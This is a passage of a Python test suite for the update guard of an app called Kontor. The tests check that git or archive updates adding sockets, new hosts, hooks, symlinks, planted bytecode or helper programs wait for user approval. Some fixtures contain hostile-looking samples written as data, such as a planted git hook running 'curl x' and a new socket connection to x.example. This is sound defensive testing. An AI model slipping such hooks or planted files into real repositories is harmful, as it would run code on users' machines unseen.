        info = updates.check("x/y")                              # not readable now: still offered; installing reads it again
        self.assertTrue(info["newer"]); self.assertNotIn("review", info)

    def test_a_helper_names_what_changes(self):
        res = self.install(changed(helper_swift=b"let p = Process()\n", VERSION=lambda b: b"1.0.1\n"))
        self.assertTrue(res.get("needs_approval")); f = res["review"]["findings"][0]
        self.assertEqual((f["kind"], f["file"], f["added"], f["removed"], f["out"]), ("file", "helper.swift", 1, 0, 1))
        self.assertRegex(f["what"], r"^(Zeilen|Lines): \+1 −0 · .+ · \+ let p = Process\(\)$")

    def test_a_check_that_fails_is_a_finding(self):
        keep = G.compare
        G.compare = lambda a, b: 1 / 0
        try:
            res = self.install(changed(VERSION=lambda b: b"1.0.1\n"))
        finally:
            G.compare = keep
        self.assertTrue(res.get("needs_approval")); self.assertEqual(kinds(res["review"]["findings"]), {"unreadable"})
        self.assertEqual(self.read("VERSION"), b"1.0.0\n")


@unittest.skipUnless(shutil.which("git"), "git fehlt")
class InstallInAClone(unittest.TestCase):
    """The program folder as a git clone: fetched, read, and moved forward only to the commit that was read -- no hook, link
    or rule of the repository gets around that."""

    def git(self, where, *args):
        r = subprocess.run(["git", "-C", where, "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false"] + list(args), capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout.strip()

    def commit(self, files, message="next"):
        for rel, data in files.items():
            full = os.path.join(self.origin, rel)
            if data is None:
                os.remove(full)
                continue
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "wb") as f:
                f.write(data)
        self.git(self.origin, "add", "-A", "-f"); self.git(self.origin, "commit", "-q", "-m", message)      # (also what .gitignore names)
        return self.git(self.origin, "rev-parse", "HEAD")

    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="kontor-guard-git-")
        self.origin, self.prog = os.path.join(self.dir, "origin"), os.path.join(self.dir, "prog")
        os.makedirs(self.origin)
        subprocess.run(["git", "-C", self.origin, "init", "-q", "-b", "main"], check=True, capture_output=True)
        self.first = self.commit(dict(SMALL, **{"tests/test_x.py": b"import socket\n"}), "first")
        subprocess.run(["git", "clone", "-q", self.origin, self.prog], check=True, capture_output=True)
        self.keep = (updates.HERE, updates._git_source)
        updates.HERE = self.prog
        updates._git_source = lambda repo: self.origin if repo == "x/y" else "https://github.com/%s.git" % repo     # (no network)

    def tearDown(self):
        updates.HERE, updates._git_source = self.keep
        shutil.rmtree(self.dir, ignore_errors=True)

    def update(self, approved=""):
        return updates.install_via_git(restart=False, approved=approved, repo="x/y")

    def head(self):
        return self.git(self.prog, "rev-parse", "HEAD")

    def test_without_findings_moved_forward(self):
        sha = self.commit({"work.py": SMALL["work.py"] + b"\n\ndef share(a, b):\n    return a * b\n", "VERSION": b"1.0.1\n", "tests/test_x.py": b"import socket\nimport subprocess\n"})
        res = self.update()
        self.assertTrue(res["ok"], res); self.assertEqual(self.head(), sha); self.assertEqual(res["version"], "1.0.1")

    def test_with_findings_it_waits_at_the_old_commit(self):
        sha = self.commit({"work.py": SMALL["work.py"] + b"\nimport socket\n", "VERSION": b"1.0.1\n"})
        res = self.update()
        self.assertTrue(res.get("needs_approval"), res); self.assertEqual(kinds(res["review"]["findings"]), {"module"})
        self.assertEqual(self.head(), self.first)
        with open(os.path.join(self.prog, "work.py"), "rb") as f:
            self.assertEqual(f.read(), SMALL["work.py"])
        self.assertTrue(self.update(approved="0" * 64).get("needs_approval"))
        # more arrives after you looked: the approval was for the earlier files
        sha2 = self.commit({"tools.py": SMALL["tools.py"] + b"\n\ndef more():\n    return run('curl')\n"})
        again = self.update(approved=res["review"]["digest"])
        self.assertTrue(again.get("needs_approval")); self.assertEqual(self.head(), self.first)
        done = self.update(approved=again["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.head(), sha2); self.assertNotEqual(sha, sha2)

    def test_hooks_links_and_rules_of_the_repository(self):
        # a hook in the clone would run on merging: git is started without hooks
        hooks = os.path.join(self.prog, ".git", "hooks")
        os.makedirs(hooks, exist_ok=True)
        mark = os.path.join(self.dir, "hook-ran")
        for name in ("post-merge", "post-checkout", "reference-transaction"):
            with open(os.path.join(hooks, name), "w") as f:
                f.write("#!/bin/sh\ntouch '%s'\n" % mark)
            os.chmod(os.path.join(hooks, name), 0o755)
        self.commit({"VERSION": b"1.0.1\n"})
        self.assertTrue(self.update()["ok"]); self.assertFalse(os.path.exists(mark))
        # a link is no file: where it points was never read
        os.symlink("tests/test_x.py", os.path.join(self.origin, "linked.py"))
        self.commit({"VERSION": b"1.0.2\n"})
        res = self.update()
        self.assertTrue(res.get("needs_approval")); self.assertEqual([(f["kind"], f["file"], f["what"]) for f in res["review"]["findings"]], [("file", "linked.py", "link")])
        self.assertFalse(os.path.lexists(os.path.join(self.prog, "linked.py")))
        os.remove(os.path.join(self.origin, "linked.py"))
        # rules of the repository that make git treat files differently when it writes them: shown
        self.commit({".gitattributes": b"*.py filter=other\n", "VERSION": b"1.0.3\n"})
        res = self.update()
        self.assertTrue(res.get("needs_approval")); self.assertEqual([(f["kind"], f["file"]) for f in res["review"]["findings"]], [("file", ".gitattributes")])
        self.assertTrue(self.update(approved=res["review"]["digest"])["ok"])
        self.commit({"VERSION": b"1.0.4\n"})                    # the rules as they are now: nothing new
        self.assertTrue(self.update()["ok"])

    def test_not_a_clone(self):
        updates.HERE = self.dir
        self.assertIsNone(self.update())

    def test_only_what_was_read_arrives(self):
        """git writes the whole new state, not only the program: a commit that changes only VERSION but brings translated Python
        (which Python runs instead of its text) and a helper's program waits -- and the approval is for the whole new state."""
        planted = {"__pycache__/work.cpython-313.pyc": b"\xf3\r\r\n\x03\x00\x00\x00evil", ".touchid/Kontor.app/Contents/MacOS/Kontor": b"\xcf\xfa\xed\xfe"}
        sha = self.commit(dict(planted, VERSION=b"1.0.1\n"))
        res = self.update()
        self.assertTrue(res.get("needs_approval"), res)
        self.assertEqual(sorted((f["kind"], f["file"]) for f in res["review"]["findings"]), [("extra", rel) for rel in sorted(planted)])
        self.assertEqual(self.head(), self.first)
        for rel in planted:
            self.assertFalse(os.path.exists(os.path.join(self.prog, rel)), rel)
        # approved for the program's files alone (what an archive would install): still waits
        self.assertTrue(self.update(approved=G.digest(dict(SMALL, VERSION=b"1.0.1\n"))).get("needs_approval"))
        self.assertEqual(self.head(), self.first)
        done = self.update(approved=res["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.head(), sha)

    def test_the_rest_of_the_repository(self):
        """What the repository holds beside the program: its tests and rules for development as text -- nothing to ask about;
        anything else that is new or changed -- no text, made by a program, outside those folders, git's hooks -- is shown."""
        self.commit({"tests/test_y.py": b"import subprocess\n", "tests/fixtures/a.xlsx": b"PK\x03\x04", ".github/workflows/t.yml": b"on: push\n",
                     ".claude/hooks/x.py": b"import os\n", ".gitignore": b"__pycache__/\n", "VERSION": b"1.0.1\n"})
        res = self.update()
        self.assertTrue(res["ok"], res)
        for name, files in (
                ("a test that is no text", {"tests/run.py": b"\x00\x01\x02"}),
                ("translated Python among the tests", {"tests/__pycache__/x.cpython-39.pyc": b"\x00"}),
                ("a program among the tests", {"tests/tool": b"\xcf\xfa\xed\xfe"}),
                ("a hidden folder of its own", {".config/x.py": b"X = 1\n"}),
                ("a hidden file at the top", {".envrc": b"export A=1\n"}),
                ("git's hooks", {".githooks/post-merge": b"#!/bin/sh\ncurl x\n"}),
                ("what the repository's own list calls made by a program", {"tests/out.coverage": b"x", ".gitignore": b"__pycache__/\n*.coverage\n"}),
                ("an app beside the program", {"Tool.app/Contents/MacOS/Tool": b"\xcf\xfa\xed\xfe"})):
            with self.subTest(name):
                self.commit(dict(files, VERSION=("1.0.%d\n" % (len(name) + 2)).encode()))
                res = self.update()
                self.assertTrue(res.get("needs_approval"), name)
                self.assertTrue({"extra", "file"} & kinds(res["review"]["findings"]), name)
                self.assertTrue(self.update(approved=res["review"]["digest"])["ok"], name)
        # what is there already, unchanged, is not asked about again
        self.commit({"VERSION": b"1.0.99\n"})
        self.assertTrue(self.update()["ok"])

    def test_fetched_only_from_the_repository_set(self):
        """The settings name the repository; the clone fetches from its origin: the two must be the same, or nothing is fetched."""
        self.commit({"VERSION": b"1.0.1\n", "work.py": SMALL["work.py"] + b"\nimport socket\n"})
        for repo in ("other/z", "", "../x", "-x/y"):
            res = updates.install_via_git(restart=False, repo=repo)
            self.assertFalse(res["ok"], repo); self.assertNotIn("needs_approval", res); self.assertIn("origin", res["text"])
        other = os.path.join(self.dir, "other")
        subprocess.run(["git", "clone", "-q", "--bare", self.origin, other], check=True, capture_output=True)
        self.git(self.prog, "remote", "set-url", "origin", other)
        res = self.update()
        self.assertFalse(res["ok"]); self.assertIn("origin", res["text"]); self.assertEqual(self.head(), self.first)
        self.git(self.prog, "remote", "set-url", "origin", self.origin)
        self.assertTrue(self.update().get("needs_approval"))
        # the same repository at GitHub, written another way, is the same
        for url in ("https://github.com/stecrz/Kontor", "https://github.com/stecrz/Kontor.git/", "git" "@github.com:Stecrz/Kontor.git", "ssh://git" "@github.com/stecrz/kontor"):
            self.assertTrue(updates._same_source(url, "https://github.com/stecrz/Kontor.git"), url)
        for url in ("https://github.com/stecrz/Kontor2", "https://github.com.x.example/stecrz/Kontor", "http://github.com/stecrz/Kontor", "https://gitlab.com/stecrz/Kontor", ""):
            self.assertFalse(updates._same_source(url, "https://github.com/stecrz/Kontor.git"), url)

    def test_the_daily_look_reads_what_installing_reads(self):
        """In a clone the settings show what installing will find -- read from the clone's origin, approved as a whole."""
        sha = self.commit({"VERSION": b"1.0.1\n", "work.py": SMALL["work.py"] + b"\nimport socket\n", "__pycache__/a.pyc": b"\x00"})
        keep = updates._get
        updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b""
        try:
            info = updates.check("x/y")
        finally:
            updates._get = keep
        self.assertTrue(info["newer"]); self.assertEqual(kinds(info["review"]["findings"]), {"module", "extra"})
        self.assertEqual(self.head(), self.first)
        done = self.update(approved=info["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.head(), sha)


def _commit(rev: str) -> bool:
    return bool(shutil.which("git")) and subprocess.run(["git", "-C", ROOT, "cat-file", "-e", rev + "^{commit}"], capture_output=True).returncode == 0


def _files_at(rev: str) -> dict:
    """Kontor's program files as they were in a commit (as an update installs them)."""
    names = subprocess.run(["git", "-C", ROOT, "ls-tree", "-r", "--name-only", rev], capture_output=True, text=True, check=True).stdout.splitlines()
    return {n: subprocess.run(["git", "-C", ROOT, "show", "%s:%s" % (rev, n)], capture_output=True, check=True).stdout for n in names if G.installable(n)}


@unittest.skipUnless(_commit("ca5b0ba") and _commit("39f7591"), "the history before 3.17.0 is not here (GitHub checks out the newest commit only)")
class ReleasedVersions(unittest.TestCase):
    """The update 3.16.100 -> 3.17.0 as it was: 121 findings, each asked about before. Now: the check, the shields that
    changed in a way that is not only stricter, the internet search's address checks, a new program started, a place
    named, the three helpers -- and one entry per way out whose calls changed, one for the internet search's filter; the
    sandbox rules that only got stricter are one quiet line. (Without the history -- GitHub's test runs -- the same in
    small: Program.test_a_major_version_asks_only_what_can_be_a_risk.)"""

    def test_3_16_100_to_3_17_0(self):
        found = G.compare(_files_at("ca5b0ba"), _files_at("39f7591"), limit=5000)
        asks = entries(found)
        self.assertLessEqual(len(asks), 16, list(asks))
        crit = {t for t, xs in asks.items() if any(x["level"] == "critical" for x in xs)}
        self.assertTrue({"check", "model_shield", "reader", "new_program:launchctl", "script:mac_app.swift", "script:mm_bridge.jxa", "script:touchid.swift"} <= crit, crit)
        self.assertTrue(all(x["level"] == "review" for t, xs in asks.items() if t.startswith("way_") or t == "filter" for x in xs))
        self.assertTrue({"privacy_problem()", "_LETTERS"} <= {x["where"] for x in asks["filter"]}, asks["filter"])
        plain = {(f["file"], f["where"]) for f in found if f["level"] == "plain"}
        self.assertTrue({("web_search.py", "reader_profile()"), ("receipt_text.py", "_profile()")} <= plain, plain)
        self.assertLess(len(json.dumps(found)), 64 * 1024)


class Settings(unittest.TestCase):
    """Einstellungen -> Updates in the browser: an update without findings looks as ever; one with findings is marked in the
    menu, shows what was found, and is installed with an approval for exactly the files shown."""

    @classmethod
    def setUpClass(cls):
        import threading
        from http.server import ThreadingHTTPServer
        sys.path.insert(0, os.path.dirname(__file__))
        from test_tour import PASSWORD, _playwright, settle
        from test_e2e import MockBridge, config_for_test, patch_today, reset_mock
        from service import App, make_handler
        from fixtures import new_store
        cls.sync_playwright, cls.settle, cls.password = staticmethod(_playwright()), staticmethod(settle), PASSWORD
        cls.dir = tempfile.mkdtemp(prefix="kontor-guard-ui-")
        store = new_store(cls.dir); store.save("config.json", config_for_test(os.path.join(cls.dir, "Belege")))
        reset_mock(); patch_today()
        cls.app = App(store, cls.dir, bridge_factory=MockBridge)
        cls.app.do_run(False, True)
        cls.srv = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(cls.app))
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.base = "http://127.0.0.1:%d/" % cls.srv.server_address[1]

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()
        shutil.rmtree(cls.dir, ignore_errors=True)

    def info(self, findings):
        return {"current": "1.0.0", "available": "9.9.9", "newer": True, "error": None, "notes": "", "date": "", "source": "main",
                "review": {"digest": "d" * 64, "findings": findings}}

    def test_marked_shown_and_approved(self):
        def find(kind, file, level, topic, title, arg="", where="", lines=(), new=True, **more):
            return dict({"kind": kind, "file": file, "what": where or arg, "new": new, "level": level, "topic": topic, "title": title,
                         "why": title.replace("upd_t_", "upd_w_"), "arg": arg, "where": where, "lines": list(lines)}, **more)
        finds = [find("guard", "update_guard.py", "critical", "check", "upd_t_check", lines=["-HARMLESS = ('json',)", "+HARMLESS = ('json', 'socket')"], new=False),
                 find("call", "work.py", "critical", "new_host:x.example", "upd_t_new_host", "x.example", "send", ["+def send(d):", "+    socket.create_connection(('x.example', 443))"]),
                 find("call", "tools.py", "review", "way_program:open", "upd_t_way_program", "open", "show", ["-subprocess.run(['open', '-R', path])", "+subprocess.run(['open', path])"], new=False),
                 find("around", "tools.py", "review", "way_program:open", "upd_t_way_program", "open", "HELPER", ["+HELPER = 1"], more=40),
                 find("address", "web/app.js", "critical", "address:x.example", "upd_t_address", "x.example/<b>a</b>", lines=["+const more = 'https://x.example/<b>a</b>';"]),
                 {"kind": "extra", "file": "Tool.app/x", "what": "Tool.app/x (made by a program)", "new": True},              # one Kontor did not judge
                 find("rule", "web_search.py", "plain", "filter", "upd_t_filter", where="GENERIC", new=False),
                 find("rule", "web_search.py", "plain", "filter", "upd_t_filter", where="_LEET", new=False)]
        self.app.update_info = self.info(finds)
        asked = []
        keep = updates.install

        def until(pg, js, seconds=15.0):                        # (no waiting with eval: the pages' security rules forbid it)
            import time
            t0 = time.time()
            while time.time() - t0 < seconds:
                if pg.evaluate(js):
                    return
                pg.wait_for_timeout(80)
            self.fail("not reached: " + js)

        def install(repo, zip_url=None, restart=True, approved=""):
            asked.append(approved)                              # read again: now it holds something else -- nothing installed
            return {"ok": False, "needs_approval": True, "version": "9.9.9", "text": "wartet", "review": {"digest": "e" * 64, "findings": finds[1:2]}}
        updates.install = install
        try:
            with self.sync_playwright() as p:
                b = p.chromium.launch()
                for device in ({"viewport": {"width": 1440, "height": 900}}, {"viewport": {"width": 390, "height": 844}, "is_mobile": True, "has_touch": True}):
                    self.app.update_info = self.info(finds)
                    pg = b.new_context(**device).new_page()
                    errors = []
                    pg.on("pageerror", lambda e: errors.append(str(e)))
                    pg.goto(self.base); pg.fill("#login-pw", self.password)
                    if pg.is_visible("#login-pw2"):
                        pg.fill("#login-pw2", self.password)
                    pg.click("#login-btn"); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                    pg.evaluate("location.hash = '#settings/updates'"); pg.wait_for_selector("#up-review", timeout=15000)
                    self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').textContent"), "!")
                    # one entry per topic (a finding not judged: by its kind), critical first; the plain ones in one quiet line
                    titles = pg.evaluate("[...document.querySelectorAll('#up-review details.up-find > summary')].map(s => s.textContent)")
                    self.assertEqual(len(titles), 5, titles)
                    self.assertEqual(titles[0], "Die Update-Prüfung selbst wurde geändert")
                    self.assertIn("Neue Verbindung ins Internet: x.example", titles)
                    self.assertIn("Aufruf eines Programms geändert: open", titles)
                    self.assertIn("Kommt im Programmordner an, ohne Teil des Programms zu sein: Tool.app/x (made by a program)", titles)
                    self.assertEqual(pg.evaluate("document.querySelectorAll('#up-review details.up-find.crit').length"), 4)
                    self.assertIn("4 Funde können ein Risiko sein, bei 1 Fund ändert sich", pg.inner_text("#up-review .note"))
                    self.assertEqual(pg.evaluate("document.querySelector('#up-plain summary').textContent"), "2 Änderungen an Regeln – nur strenger")
                    # opened: the explanation, where, and the lines folded; every text of the update's files shown as text
                    pg.click("#up-review details.up-find:nth-child(3) > summary")
                    body = pg.inner_text("#up-review details.up-find:nth-child(3) .up-body")
                    self.assertIn("Kontor startet dieses Programm schon heute", body); self.assertIn("tools.py · show", body); self.assertIn("tools.py · HELPER", body)
                    self.assertFalse(pg.is_visible("#up-review details.up-find:nth-child(3) pre.up-diff"))
                    pg.click("#up-review details.up-find:nth-child(3) .up-part:nth-child(3) details.up-lines > summary")
                    self.assertIn("… und 40 weitere Zeilen", pg.inner_text("#up-review details.up-find:nth-child(3) .up-part:nth-child(3) pre.up-diff"))
                    self.assertEqual(pg.evaluate("document.querySelector('#up-review').querySelectorAll('b b, code b, pre b').length"), 0)
                    self.assertIn("<b>a</b>", pg.evaluate("document.querySelector('#up-review').textContent"))
                    self.assertEqual(pg.inner_text("#up-install").strip(), "Freigeben und installieren")
                    self.assertLessEqual(pg.evaluate("document.documentElement.scrollWidth"), pg.evaluate("document.documentElement.clientWidth") + 1)
                    # not confirmed: nothing is asked of the service
                    pg.once("dialog", lambda d: d.dismiss()); pg.click("#up-install"); pg.wait_for_timeout(200)
                    self.assertEqual(asked, [])
                    # confirmed: approved for the files shown; Kontor reads again, finds something else and shows that instead
                    pg.once("dialog", lambda d: d.accept()); pg.click("#up-install")
                    until(pg, "document.querySelectorAll('#up-review details.up-find').length === 1")
                    self.assertEqual(asked, ["d" * 64]); asked.clear()
                    self.assertEqual(self.app.update_info["review"]["digest"], "e" * 64)
                    # only what is plain: as ever -- a dot in the menu, the plain button, the quiet line, no question
                    self.app.update_info = self.info(finds[-2:])
                    pg.reload(); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                    pg.wait_for_selector("#up-install", timeout=15000)
                    self.assertIsNone(pg.query_selector("#up-review")); self.assertIsNotNone(pg.query_selector("#up-plain"))
                    self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').className"), "nbadge")       # the plain dot
                    self.assertEqual(pg.inner_text("#up-install").strip(), "Update installieren und Dienst neu starten")
                    pg.click("#up-install"); until(pg, "document.querySelector('#up-review') !== null")     # (the stand-in answers "waits")
                    self.assertEqual(asked, [""]); asked.clear()
                    # an update without findings: no word about them
                    self.app.update_info = self.info([])
                    pg.reload(); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                    pg.wait_for_selector("#up-install", timeout=15000)
                    self.assertIsNone(pg.query_selector("#up-review")); self.assertIsNone(pg.query_selector("#up-plain"))
                    self.assertEqual(errors, [])
                    pg.context.close()
                b.close()
        finally:
            updates.install = keep
            self.app.update_info = None


if __name__ == "__main__":
    unittest.main()
